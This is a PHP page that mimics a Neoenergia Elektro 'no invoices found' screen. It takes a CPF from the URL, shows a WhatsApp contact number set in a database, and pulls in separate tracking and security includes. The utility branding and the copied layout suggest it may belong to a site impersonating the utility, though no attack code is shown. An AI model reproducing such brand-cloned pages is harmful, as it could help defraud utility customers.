<?php
require_once __DIR__ . '/config.php';
addSecurityHeaders();

// Buscar configuração do WhatsApp
$whatsappAtivo = false;
$whatsappNumero = '';
try {
    $pdo = getConnection();
    $stmt = $pdo->prepare("SELECT valor, ativo FROM configuracoes WHERE chave = 'whatsapp' LIMIT 1");
    $stmt->execute();
    $wppConfig = $stmt->fetch();

    // Cast defensivo: no MySQL pode vir como '0'/'1' ou até string
    $ativo = isset($wppConfig['ativo']) ? (int)$wppConfig['ativo'] : 0;
    $valor = isset($wppConfig['valor']) ? trim((string)$wppConfig['valor']) : '';

    if ($ativo === 1 && $valor !== '') {
        $whatsappAtivo = true;
        $whatsappNumero = $valor;
    }
} catch (Exception $e) {
    // Ignorar erro, manter desativado
}

$cpf = isset($_GET['cpf']) ? sanitize($_GET['cpf']) : '';
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sem Faturas - Neoenergia Elektro</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="assets/favicon.png">
    <link rel="stylesheet" href="assets/lovable-base.css">
    <style>
        /* Page-specific overrides */
        :root {
            --background: hsl(0, 0%, 100%);
            --foreground: hsl(0, 0%, 20%);
            --neo-green: #00A443;
            --neo-green-dark: #007F33;
            --neo-green-hex: #00A443;
            --neo-green-dark-hex: #007F33;
        }
        
        body {
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: white;
            color: var(--foreground);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            -webkit-font-smoothing: antialiased;
        }
        
        /* Header Verde - Idêntico ao Lovable */
        .header {
            background: var(--neo-green);
            width: 100%;
        }
        
        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 16px;
        }
        
        .header-content {
            height: 64px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        
        .menu-btn {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            color: rgba(255, 255, 255, 0.9);
            cursor: pointer;
        }
        
        .header-logo {
            height: 48px;
            width: auto;
        }
        
        .login-btn {
            height: 36px;
            padding: 0 16px;
            border-radius: 6px;
            background: var(--neo-green-dark);
            color: white;
            font-size: 14px;
            font-weight: 500;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        /* Main Content */
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 32px 16px;
        }
        
        .container {
            max-width: 512px;
            text-align: center;
            animation: fadeInUp 0.4s ease;
        }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .illustration {
            width: 384px;
            max-width: 100%;
            margin: 0 auto 32px;
        }
        
        .illustration img {
            width: 100%;
            height: auto;
        }
        
        .title {
            font-size: 24px;
            font-weight: 500;
            color: #EF4444;
            margin-bottom: 32px;
            padding: 0 16px;
        }
        
        .btn-primary {
            display: inline-block;
            height: 48px;
            line-height: 48px;
            padding: 0 48px;
            border-radius: 24px;
            font-size: 14px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            background: var(--neo-green);
            color: white;
            border: none;
            cursor: pointer;
            text-decoration: none;
            transition: opacity 0.2s;
        }
        
        .btn-primary:hover {
            opacity: 0.9;
        }
        
        /* Footer */
        .footer {
            background: var(--background);
            border-top: 4px solid var(--neo-green);
            padding: 16px;
        }
        
        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .footer img {
            width: 100%;
            max-width: 420px;
            display: block;
            margin: 0 auto;
        }
    </style>
    <?php include __DIR__ . '/includes/security.php'; ?>
</head>
<body>
    <!-- Header Verde -->
    <header class="header">
        <div class="header-container">
            <div class="header-content">
                <div class="header-left">
                    <button type="button" class="menu-btn" aria-label="Abrir menu">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <line x1="4" y1="12" x2="20" y2="12"></line>
                            <line x1="4" y1="6" x2="20" y2="6"></line>
                            <line x1="4" y1="18" x2="20" y2="18"></line>
                        </svg>
                    </button>
                    <img src="assets/logo-neoenergia-header.svg" alt="Neoenergia" class="header-logo">
                </div>
                <button type="button" class="login-btn">
                    Login
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="5" y1="12" x2="19" y2="12"></line>
                        <polyline points="12 5 19 12 12 19"></polyline>
                    </svg>
                </button>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main">
        <div class="container">
            <!-- Ilustração - Idêntica ao Lovable -->
            <div class="illustration">
                <img src="assets/illustracao-sem-fatura.svg" alt="Sem faturas em aberto">
            </div>
            
            <h1 class="title">Não existem faturas disponíveis para este documento fiscal nesta distribuidora.</h1>
            
            <a href="index.php" class="btn-primary">Finalizar</a>
        </div>
    </main>

    <?php if ($whatsappAtivo && !empty($whatsappNumero)): ?>
    <!-- WhatsApp Button -->
    <a href="https://wa.me/<?= preg_replace('/\D/', '', $whatsappNumero) ?>?text=<?= urlencode('Olá, preciso de atendimento sobre minha fatura.') ?>" 
       target="_blank"
       rel="noopener noreferrer"
       class="whatsapp-float"
       aria-label="Falar no WhatsApp">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
        </svg>
        <span class="whatsapp-text">Falar com atendente</span>
    </a>
    <style>
        .whatsapp-float {
            position: fixed;
            bottom: 24px;
            right: 24px;
            z-index: 50;
            display: flex;
            align-items: center;
            gap: 12px;
            background: #25D366;
            color: white;
            padding: 12px 20px;
            border-radius: 9999px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            transition: all 0.2s;
            text-decoration: none;
        }
        .whatsapp-float:hover {
            background: #20BA5C;
            transform: scale(1.05);
        }
        .whatsapp-text {
            font-weight: 500;
            font-size: 14px;
        }
        @media (max-width: 639px) {
            .whatsapp-text { display: none; }
            .whatsapp-float { padding: 12px; }
        }
    </style>
    <?php endif; ?>

    <!-- Footer - Idêntico ao Lovable -->
    <footer style="background: white; border-top: 4px solid var(--neo-green);">
        <div style="max-width: 1200px; margin: 0 auto; padding: 16px;">
            <!-- Mobile -->
            <img src="assets/footer-mobile.png" alt="Rodapé Neoenergia" style="width: 100%; max-width: 28rem; margin: 0 auto; display: block;" class="footer-mobile">
            <!-- Desktop -->
            <img src="assets/footer-desktop.png" alt="Rodapé Neoenergia" style="width: 100%; display: none;" class="footer-desktop">
        </div>
    </footer>
    <style>
        @media (min-width: 768px) {
            .footer-mobile { display: none !important; }
            .footer-desktop { display: block !important; }
        }
    </style>

<?php include __DIR__ . '/includes/tracking.php'; ?>
<?php include __DIR__ . '/includes/chat-widget.php'; ?>
</body>
</html>
